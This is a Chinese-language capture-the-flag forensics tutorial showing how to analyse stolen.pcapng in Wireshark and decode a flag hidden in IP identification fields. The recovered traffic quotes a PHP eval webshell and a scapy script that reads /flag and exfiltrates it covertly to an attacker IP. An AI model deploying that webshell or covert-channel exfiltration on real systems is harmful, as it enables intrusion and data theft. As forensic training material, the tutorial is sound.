# Wireshark 实战课：手把手复现 stolen.pcapng 分析

> 环境：Wireshark 4.6.9（装在 D:\Program Files\Wireshark）
> 目标：不写任何代码，纯 GUI 操作，把 flag 找出来
> 跟着做，每步都能在屏幕上看到结果

---

## 第 0 课：认识界面（现在你眼前的东西）

打开文件后，窗口分成 4 个区域：

```
┌─────────────────────────────────────────────┐
│ 菜单栏: File Edit View Go Capture Analyze ... │
│ 工具栏: 鲨鱼/红色方块/停止...（抓包用，分析文件用不到）│
│ 显示过滤器栏:  [ip.proto == 0        ] ⭐ fx │ ← 最重要!
├─────────────────────────────────────────────┤
│ 包列表窗格（上半）: No. Time Source Dest Prot Len Info │  ← 每个包一行
├──────────────┬──────────────────────────────┤
│ 包详情窗格     │  包字节窗格（hex+ASCII 对照）      │
│ (左下,分层树)  │  (右下,点谁显示谁的原始字节)        │
└──────────────┴──────────────────────────────┘
```

**核心概念**：点包列表的某一行 → 左下显示该包的分层解析树（可以一层层展开）→ 右下显示原始字节。点详情树里的任意字段（比如 `Identification: 0x6611`）→ 右下对应字节会高亮。

---

## 第 1 课：先看统计，别急着翻包

菜单 **Statistics → Protocol Hierarchy**（统计 → 协议分级）

看到类似（这是本文件的真实数据，GUI 与 tshark 结果一致）：

```
frame                                    255
  eth                                    255
    ip                                   253   End Packets: 31   ← ★终点在IP层的裸包!
      tcp                                180
        http                              40
      icmp                                39   ← 8个ping + 31个unreachable错误回包
      udp                                  3
    arp                                    2
```

**读法（先看两列再想）**：
- 缩进 = 包含关系。`tcp` 缩进在 `ip` 下面 = TCP 包都是 IP 包；正常流量的链条永远是 `frame → eth → ip → tcp/udp/icmp → ...`
- **Packets 列** = 该协议**连同它下面所有子协议**涉及的包数
- **End Packets 列**（GUI 里有、tshark 文本版没有）= 解析到**这一层就结束**的包数，也就是"没有更深层协议"的包

**交叉验证**：253 = 180(TCP) + 39(ICMP) + 3(UDP) + **31(终点在IP层)** —— 这 31 个就是"断"在 IP 层的裸包，答案就藏在里面。

关掉窗口，回到主界面。

---

## 第 2 课：Follow Stream 读故事线

1. 在显示过滤器栏输入：`http.request.method == "POST"` 回车 —— 只剩几个 POST 包
2. 双击最上面的 POST 包（绿色框第 3 列 Info 显示 `POST / HTTP/1.1`）
3. 右键这个包 → **Follow → HTTP Stream**（追踪 → HTTP 流）；快捷键 `Ctrl+Alt+Shift+T`

弹出一个新窗口，里面是**请求+响应拼接的完整对话**。往下滚，能看到：

```
POST / HTTP/1.1
Host: afctf.hack
Content-Type: multipart/form-data; boundary=-----------------------------7e51...

------------------------------7e51...
Content-Disposition: form-data; name="upfile";
   filename="C:\Documents and Settings\Administrator\hack2.php"
Content-Type: application/octet-stream

<?php @eval($_GET[1]);?>
------------------------------7e51...--
```

这就是**上传文件**：`boundary` 是分隔线，`filename=` 是文件名，下面空一行就是文件内容。

**任务**：窗口左上角有 `Stream 0` 字样和一个下拉箭头 ▼ —— 点它切换流（Stream 1、Stream 2...），找到上传 `hack.py` 的那条流，把它完整读一遍。你会看到：

```python
from scapy.all import *
with open('/flag', 'r') as f:
    s = f.readline()
    count = 1
    for i in s:
        res = ord(i) * 16 * 16 + count
        count += 1
        ip = IP(dst="192.168.159.138", id = res)
        send(ip, iface="eth0")
```

**记住这两行（编码公式）**：
```
id = 字符ASCII码 × 256 + 位置
解码反过来：字符 = id ÷ 256（整除），位置 = id % 256（取余）
```

关闭 Follow Stream 窗口。

---

## 第 3 课：Ctrl+F 全局搜索 + 识别干扰项

1. 按 `Ctrl+F` → 顶部出现搜索栏，输入 `flag`
2. 左边下拉选 **"Packet details"**（或 String），点 **Find Next**（查找下一个）

会依次跳转到几个包——双击 Info 里 `POST` 的包，看左下详情树，找到：

```
HTML Form URL Encoded / MIME Multipart Media Encapsulation
  MIME Multipart Media Encapsulation
    Encapsulated multipart part
      Content-Disposition: form-data; name="upfile"; filename="C:\ftp\flag.txt"
      Data (44 bytes): flag{xxxx}
```

**结论：这是攻击者上传的假 flag（占位符），不是答案。** 真 flag 在服务器 `/flag` 里（hack.py 读的路径），攻击者正把它偷出来。

---

## 第 4 课：找异常流量 —— 裸 IP 包

1. 过滤器栏清空，输入：`ip.proto == 0` 回车

> 💡 不会拼字段？点过滤器栏左边的 **fx 按钮**（表达式编辑器）→ 搜索框输入 `proto` → "IPv4 协议号" → 选 `== 0` 插入，还能顺便看看其他字段长什么样。

2. 现在列表只剩 **31 个包**（帧号 136、138、140……198，注意 Wireshark 帧号从 1 开始）。观察：
   - Source 全是 `192.168.159.136`（服务器），Destination 全是 `192.168.159.138`（攻击者）
   - Protocol 列显示 **`IPv4`**、Info 列**空白** —— 说明它没进入任何传输层协议（TCP/UDP/ICMP 包这里都会显示协议名+描述），**这种行就是裸包**
   - 时间列间隔均匀（约 50ms）—— 脚本循环发送的节奏

3. 现在把 id 字段显示出来：右键任意列头（比如 Time）→ **Column Preferences...**（列首选项）→ 点 **+** 添加一行 → Type 选 `Custom` → Fields 输入 `ip.id`（或从下拉找 IPv4.Identification）→ OK 关闭

4. 看新列的值：`26113`、`27650`、`24835`、`26372`……
   **正常系统的 id 是连续递增的计数器，这些值乱七八糟 = 人为塞进去的数据。** 这就是 flag 的载体。

5. 双击第一个包（No.135），左下详情树展开 **Internet Protocol Version 4 → Identification: 0x6611 (26113)**
   点击这行，右下字节窗格会高亮十六进制 `66 11` —— **数据就在最原始的字节里**。

6. 在过滤器栏把 `ip.proto == 0` 改成 `icmp` 回车：看到每个裸包后面都跟着一个 `Destination unreachable`（ICMP 错误）—— 那是攻击者机器自动回的（proto=0 没程序应答）。**这些回包证明 31 个裸包全部到达，没丢。**

---

## 第 5 课：解码（不用写代码版）

**方法 A：计算器手算**
- 打开 Windows 计算器（Win+R 输入 calc），切到"程序员"模式
- 第一个 id 26113：`26113 ÷ 256 = 102`（商）→ 102 = ASCII 码 = `f`；`26113 % 256 = 1` = 位置 1
- 验算：26113 = 102×256 + 1 ✓
- 第二个 27650 ÷ 256 = 108 = `l`，余 2 ✓ —— 规律成立，继续算完 31 个拼出来

**方法 B：CSV 导出批量算（推荐，学个新技能）**
1. 过滤器保持 `ip.proto == 0`
2. 菜单 **File → Export Packet Dissections → As CSV...**（导出分组解析 → 作为CSV）
3. 文件类型选 CSV，勾选 **Packet summary**，点 Format 按钮 → 在列表里把 `ip.id`、`ip.src`、`ip.dst` 加进去，保存到桌面
4. 用 Excel / WPS 打开：写两列公式 `商=INT(id/256)`、`余数=MOD(id,256)`，商转字符用 `=CHAR(商)`，按余数排序，拼起来

**方法 C：tshark 一行命令（Wireshark 自带命令行，也算 GUI 之外的进阶）**
```powershell
& 'D:\Program Files\Wireshark\tshark.exe' -r 'C:\Users\XiaoMibook\Downloads\stolen.pcapng' -Y 'ip.proto == 0' -T fields -e ip.id -e ip.src
```

得到：`flag{this_is_stolen_secret!!!}`

**验证套路**：位置 5 是 `{`、位置 30 是 `}`、最后一位是换行符 `\n`（readline 读进来的）—— 格式完整 = 解对了。

---

## 第 6 课：顺手排除干扰项（字母串之谜）

之前在字符串里看到 `abcdefghijklmnopqrstuvwabcdefghi`：
1. 过滤器输入 `icmp`，找到目标 IP 192.168.159.138 发出的 echo 包（No.43）
2. 详情树：**Internet Control Message Protocol → Type: 8 (Echo (ping) request)**
3. 下面的 **Data (35 bytes)** 展开就是这串字母

结论：攻击者在测信道连通性的 ping，载荷是测试数据，无关 flag。

---

## 第 7 课：常用基本功（以后做题靠这些）

| 功能 | 操作 | 用途 |
|------|------|------|
| 时间格式 | View → Time Display Format → 可切相对时间/epoch | 看节奏、看间隔 |
| 表达式编辑器 | 过滤器栏左边 fx 按钮 | 不会写过滤器时可视化拼 |
| 保存过滤器 | 输好过滤器 → 点过滤栏星号 ⭐ → 起名 | 常用条件一键切换 |
| 着色规则 | View → Coloring Rules | 高亮自己关心的包 |
| 导出对象 | File → Export Objects → HTTP/FTP | **一键提取流量里的文件** |
| 会话统计 | Statistics → Conversations | 找传输量大/可疑的会话 |
| 复制原始字节 | 右下字节窗格右键 → Copy → ...as Hex Dump | 提数据 |
| 只看某会话 | 右键包 → Conversation Filter → TCP | 过滤成一条流的所有包 |

---

## 小测验（做完算过关）

1. 用第 4 课的 ip.id 列，说出第 5 个裸包（No.143）的 id 是多少？它代表哪个字符？
2. `ip.proto == 0` 和 `tcp` 过滤出来的包数量各是多少？
3. 如果攻击者改用 TTL 字段藏数据（每个包 TTL = 字符码），你该加哪一列？怎么改过滤器？